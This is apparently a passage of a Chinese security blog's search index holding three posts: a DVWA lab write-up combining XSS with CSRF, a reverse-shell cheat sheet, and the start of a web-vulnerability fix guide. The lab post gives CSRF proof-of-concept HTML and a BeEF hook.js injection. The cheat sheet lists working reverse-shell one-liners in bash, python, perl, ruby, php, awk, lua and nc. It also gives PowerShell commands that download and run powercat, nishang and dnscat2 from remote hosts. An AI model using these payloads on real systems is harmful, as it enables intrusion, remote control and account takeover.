","date":"2023-11-17","objectID":"/xss/:7:3","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#信息收集-1"},{"categories":["notes"],"content":"XSS+CSRF组合打法 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:0:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#"},{"categories":["notes"],"content":"\rXSS+CSRF组合打法看了一位大佬的复现笔记，自己也做了一下。 靶场平台是DVWA，服务器都是挂在本地。 这种攻击手法需要在Security Level为low的等级下进行 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:0:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#xsscsrf组合打法"},{"categories":["notes"],"content":"\r存储型 XSS + CSRF","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#存储型-xss--csrf"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 \u003chtml\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"42\" ); function pausecomp(millis){ var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis);} function fireForms(){ var count = 1; var i=0; for(i=0; i\u003ccount; i++){ document.forms[i].submit(); pausecomp(pauses[i]);}} \u003c/script\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://192.168.38.132:80/dvwa/vulnerabilities/csrf/?password_new=12345678\u0026password_conf=12345678\u0026Change=Change\"\u003e \u003cinput type=\"hidden\" name=\"password_new\" value=\"123123\"/\u003e \u003cinput type=\"hidden\" name=\"password_conf\" value=\"123123\"/\u003e \u003cinput type=\"hidden\" name=\"Change\" value=\"Change\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eOWASP CRSFTester Demonstration\u003c/title\u003e \u003c/head\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"17\",\"23\" ); function pausecomp(millis) { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis); } function fireForms() { var count = 2; var i=0; for(i=0; i\u003ccount; i++) { document.forms[i].submit(); pausecomp(pauses[i]); } } \u003c/script\u003e \u003cH2\u003eOWASP CRSFTester Demonstration\u003c/H2\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://www.test.com:80/DVWA/vulnerabilities/csrf/?password_current=111\u0026password_new=111\u0026password_conf=111\u0026Change=Change\u0026user_token=c2458bf983aa09631d2abcb07e0f9849\"\u003e \u003cinput type=\"hidden\" name=\"name\" value=\"value\"/\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 随后构造XSS代码 \u003cscript src=\"x\" onerror=javascript:window.open(\"http://192.168.38.1/csrf.html\")\u003e\u003c/script\u003e 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#1构造poc"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e OWASP CRSFTester Demonstration OWASP CRSFTester Demonstration 随后构造XSS代码 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#首先构造csrf代码"},{"categories":["notes"],"content":"\r1.构造poc\r首先构造CSRF代码使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。 使用CSRFTester抓取流量有几个要点： 浏览器代理端口为8008 CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则127.0.0.1 www.test.com 打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change 之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。 之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。 对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的，最后修改后的 CSRF POC 代码如下。 可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP 同时，通过CSRFTester导出的原始数据如下，可以对比一下： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e OWASP CRSFTester Demonstration OWASP CRSFTester Demonstration 随后构造XSS代码 根据需要进行修改 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#随后构造xss代码"},{"categories":["notes"],"content":"\r2.进行xss攻击在 XSS (Stored) 模块下，插入 XSS 代码 在 DVWA 中会碰到 POC 太长而无法输入完全的情况，这个时候在开发者工具中将这个框的 maxlength 值设置大一点即可，这里我设置了 500. 点击 sign guestbook 按钮，POC 就会被插进去了，之后用其他浏览器登陆其他用户，访问存储型 XSS 模块页面，就会触发xss 访问页面后，浏览器会自动跳转，同时返回修改密码的界面，如果弹出页面显示如上图中的 Password Changed 字样，就说明受害者的密码修改成功了，而这也仅仅是因为受害者点击了一个页面。 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:1:2","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#2进行xss攻击"},{"categories":["notes"],"content":"\rCSRF + SelfXSS​ 在这套组合打法中，用到了BeFF工具： ​ BeFF:The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。 ​ BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:0","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#csrf--selfxss"},{"categories":["notes"],"content":"\r安装：一般是安装在linux系统里的 sudo apt-get install beef-xss 随后可运行 sudo beef-xss 随后可以看到我们的钩子js代码 ip需要自行修改为主机ip，钓鱼页面(被攻击页面)是因为插入了一下js脚本： Js脚本： \u003cscript src=\"http://192.168.3.59:3000/hook.js\"\u003e\u003c/script\u003e 目标打开带有js脚本的文件后 然后beef中会看到被害者上线，可以进行控制，可以记录键盘输入 相关的配置文件在目录：/usr/share/beef-xss/下的config.yaml中 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:1","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#安装"},{"categories":["notes"],"content":"\r实操：浏览器输入http://192.168.3.59:3000/demos/butcher/index.html打开默认测试页面 随后进入http://192.168.3.59:3000/ui/panel页面，就会看到自己被上线 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:2","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#实操"},{"categories":["notes"],"content":"\r模块命令的使用和模块的作用种类：**Broser：**主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。 **Chrome extensions：**主要是针对谷歌浏览器扩展插件 **Debug：**调试功能 **Exploits：**漏洞利用，主要利用一些已公开的漏洞进行攻击测试 **Host：**针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等 **IPEC：**协议间通信。主要是用来连接、控制受害者浏览器的 **Metasploit：**Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试 **Misc：**杂项。 **Network：**网络扫描 **Persistence：**维护受害者访问 **Phonegap：**手机测试 **Social engineering：**社会工程学攻击 其中： 绿色模块：可以执行且目标不可见 红色模块：不适合当前目标 橙色模块：可以执行但目标可见 灰色模块：未在目标浏览器上测试过 **比如，**可以使目标主机浏览器发出某种音频 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:3","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#模块命令的使用和模块的作用种类"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 \u003cscript src=\"http://192.168.38.129:3000/hook.js\"\u003e\u003c/script\u003e 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc \u003chtml\u003e \u003cbody onload=\"javascript:fireForms()\"\u003e \u003cscript language=\"JavaScript\"\u003e var pauses = new Array( \"54\" ); function pausecomp(millis){ var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date \u003c millis);} function fireForms(){ var count = 1; var i=0; for(i=0; i\u003ccount; i++){ document.forms[i].submit(); pausecomp(pauses[i]);}} \u003c/script\u003e \u003cform method=\"GET\" name=\"form0\" action=\"http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=\u003cscript src='http://192.168.38.129:3000/hook.js'\u003e\u003c/script\u003e\"\u003e \u003cinput type=\"hidden\" name=\"name\" value=\"\u003cscript src='http://192.168.38.129:3000/hook.js'\u003e\u003c/script\u003e\"/\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#1构造-poc"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#首先构造xss代码"},{"categories":["notes"],"content":"\r1.构造 POC\r首先构造XSS代码 构造 CSRF 代码CSRFTester 工具生成 CSRF POC。 修改之后的poc 将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。 http://192.168.38.1/csrf.html ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:4","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#构造-csrf-代码"},{"categories":["notes"],"content":"\r2.beef上线打开链接后，beef 中就能看到上线的主机了。 这个组合打法是需要诱导受害者点击构造的 CSRF 链接的，利用难度要高于第一个组合 ","date":"2023-11-17","objectID":"/xss-csrf_combination/:2:5","series":null,"tags":["notes"],"title":"XSS+CSRF组合打法","uri":"/xss-csrf_combination/#2beef上线"},{"categories":["web"],"content":"总(ban)结(yun)来的弹shell多种手法 ","date":"2023-11-17","objectID":"/nc-shell/:0:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#"},{"categories":["web"],"content":"\r1.nc参数 (1) -l 用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。 (2) -p \u003cport\u003e 指定端口，暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数） (3) -s 指定发送数据的源IP地址，适用于多网卡机 (4) -u 指定nc使用UDP协议，默认为TCP (5) -v 输出交互或出错信息，新手调试时尤为有用 (6)-w 超时秒数，后面跟数字 (7)-z 表示zero，表示扫描时不发送任何数据 (8)-n 直接使用IP地址，而不通过域名服务器； (9)-e 执行某个程序 目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下： wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake \u0026\u0026 make installmake clean ","date":"2023-11-17","objectID":"/nc-shell/:1:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#1nc参数"},{"categories":["web"],"content":"\r2.nc建立连接","date":"2023-11-17","objectID":"/nc-shell/:2:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#2nc建立连接"},{"categories":["web"],"content":"\r消息共享服务端启动监听 nc -lnvp 4444 客户端进行连接 nc -nv IP 4444 客户端与服务端实现消息共享，即客户端的输入服务端可见，服务端的输入客户端可见。 ","date":"2023-11-17","objectID":"/nc-shell/:2:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#消息共享"},{"categories":["web"],"content":"\r文件传输和局域网聊天是原理一样的，不过把输入输出重定向到文件 服务端设置监听 exe -lnvp 4444 \u003erecv.txt 客户端发送： nc IP 4444 \u003c1.txt 注：服务端和客户端都可做为接收端和发送端，发送端必须要有文件，接收端可以不创建文件，当接受端不创建文件时，会自动创建并将发送端地内容保存到文件，如果已存在文件将会覆盖其中内容 ","date":"2023-11-17","objectID":"/nc-shell/:2:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#文件传输"},{"categories":["web"],"content":"\r3.正向弹shell在服务端（靶标机）启动监听 nc -lvvp 4444 -e /bin/bash 在客户端（攻击机）连接 nc IP 4444 这种连接又称正向连接，攻击机主动连接靶标机。 连接成功后便可执行命令。 ","date":"2023-11-17","objectID":"/nc-shell/:3:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#3正向弹shell"},{"categories":["web"],"content":"\r4.反向弹shell","date":"2023-11-17","objectID":"/nc-shell/:4:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#4反向弹shell"},{"categories":["web"],"content":"\rbash版本本地作为服务端开启监听（攻击机） nc -lvnp 4444 或nc -vvlp 4444 目标机开启反弹 bash -i \u003e\u0026 /dev/tcp/IP/4444 0\u003e\u00261 bash -i 创建一个交互式的bash shell \u0026\u003e 将标准输出和标准错误都重定向到我们指定的文件 /dev/tcp/IP/4444 建立连接到IP的4444端口 0\u003e\u00261 将文件描述符0重定向为文件描述符1，也就是标准输入被重定向为标准输出 ","date":"2023-11-17","objectID":"/nc-shell/:4:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#bash版本"},{"categories":["web"],"content":"\rpython 反弹本地作为服务器开启监听 nc -lvvp 444 靶机作为客户端开启反弹 python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 连的时候会稍微有点慢 ","date":"2023-11-17","objectID":"/nc-shell/:4:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#python-反弹"},{"categories":["web"],"content":"\rnc反弹本地作为服务器开启监听 nc -lvvp 4444 靶标机作为客户端反弹shell nc -e /bin/bash IP 4444 ","date":"2023-11-17","objectID":"/nc-shell/:4:3","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc反弹"},{"categories":["web"],"content":"\rawk反弹 awk 'BEGIN{s=\"/inet/tcp/0/VPS_IP/1234\";for(;s|\u0026getline c;close(c))while(c|getline)print|\u0026s;close(s)}' ","date":"2023-11-17","objectID":"/nc-shell/:4:4","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#awk反弹"},{"categories":["web"],"content":"\rphp反弹本地作为服务器开启监听 nc -lvnp 4444 靶标机作为客户端反弹shell php- 'exec(\"/bin/bash -i \u003e\u0026 /dev/tcp/ip/4444\")' 或 php -r '$sock=fsockopen(\"IP\",4444);exec(\"/bin/bash -i 0\u003e\u00263 1\u003e\u00263 2\u003e\u00263\");' ","date":"2023-11-17","objectID":"/nc-shell/:4:5","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#php反弹"},{"categories":["web"],"content":"\rperl反弹本地作为服务器开启监听 nc -lvvp 4444 靶标机作为客户端反弹shell perl -e 'use Socket;$i=\"IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' ","date":"2023-11-17","objectID":"/nc-shell/:4:6","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#perl反弹"},{"categories":["web"],"content":"\rruby反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell ruby -rsocket -e'f=TCPSocket.open(\"IP\",4444).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' ","date":"2023-11-17","objectID":"/nc-shell/:4:7","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#ruby反弹"},{"categories":["web"],"content":"\rJava反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell r = Runtime.getRuntime() p = r.``exec``([``\"/bin/bash\"``,``\"-c\"``,``\"exec 5\u003c\u003e/dev/tcp/IP/4444;cat \u003c\u00265 | while read line; do \\$line 2\u003e\u00265 \u003e\u00265; done\"``] as String[]) p.waitFor() ","date":"2023-11-17","objectID":"/nc-shell/:4:8","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#java反弹"},{"categories":["web"],"content":"\rlua版本本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘IP’,‘4444’);os.execute(’/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263’);” ","date":"2023-11-17","objectID":"/nc-shell/:4:9","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#lua版本"},{"categories":["web"],"content":"\rnc不使用-e参数反弹本地作为服务器开启监听端口 nc -lvvp 4444 靶标作为客户端反弹shell mknod` `/tmp/backpipe` `p /bin/sh` `0\u003c``/tmp/backpipe` `| nc IP 4444 1\u003e``/tmp/backpipe /bin/bash` `-i \u003e ``/dev/tcp/IP````/4444 ``0\u003c\u00261 2\u003e\u00261 ```mknod backpipe p \u0026\u0026 telnet IP 4444 0backpipe` ","date":"2023-11-17","objectID":"/nc-shell/:4:10","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc不使用-e参数反弹"},{"categories":["web"],"content":"\r5.Windows下反弹shell","date":"2023-11-17","objectID":"/nc-shell/:5:0","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#5windows下反弹shell"},{"categories":["web"],"content":"\rnc反弹shell netcat 下载：https://eternallybored.org/misc/netcat/ 服务端反弹：nc VPS_IP 1234 -e c:\\windows\\system32\\cmd.exe ","date":"2023-11-17","objectID":"/nc-shell/:5:1","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nc反弹shell"},{"categories":["web"],"content":"\rpowershell反弹powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。 PS C:\\WWW\u003epowershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c VPS_IP -p 1234 -e cmd 下载到目标机器本地执行： PS C:\\WWW\u003e Import-Module ./powercat.ps1 PS C:\\WWW\u003e powercat -c VPS_IP -p 1234 -e cmd ","date":"2023-11-17","objectID":"/nc-shell/:5:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#powershell反弹"},{"categories":["web"],"content":"\rMSF反弹shell使用msfvenom生成相关Payload msfvenom -l payloads | grep 'cmd/windows/reverse' msfvenom -p cmd/windows/reverse_powershell LHOST=VPS_IP LPORT=1234 ","date":"2023-11-17","objectID":"/nc-shell/:5:3","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#msf反弹shell"},{"categories":["web"],"content":"\rCobalt strike反弹shell1、配置监听器：点击Cobalt Strike——\u003eListeners——\u003e在下方Tab菜单Listeners，点击add。 2、生成payload：点击Attacks——\u003ePackages——\u003eWindows Executable，保存文件位置。 3、目标机执行powershell payload ","date":"2023-11-17","objectID":"/nc-shell/:5:4","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#cobalt-strike反弹shell"},{"categories":["web"],"content":"\rEmpire反弹shell usestager windows/launcher_vbs info set Listener test execute ","date":"2023-11-17","objectID":"/nc-shell/:5:5","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#empire反弹shell"},{"categories":["web"],"content":"\rnishang反弹shell反弹TCPshell powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress VPS_IP -port 1234 反弹UDPshell powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1'); Invoke-PowerShellUdp -Reverse -IPAddress VPS_IP -port 1234 ","date":"2023-11-17","objectID":"/nc-shell/:5:6","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nishang反弹shell"},{"categories":["web"],"content":"\rDnscat反弹shell项目地址： https://github.com/iagox86/dnscat2github.com/iagox86/dnscat2 服务端： ruby dnscat2.rb --dns \"domain=lltest.com,host=xx.xx.xx.xx\" --no-cache -e open -e open 目标主机： powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx ","date":"2023-11-17","objectID":"/nc-shell/:5:7","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#dnscat反弹shell"},{"categories":["web"],"content":"常见web漏洞加固策略 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:0:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#1sql注入"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ 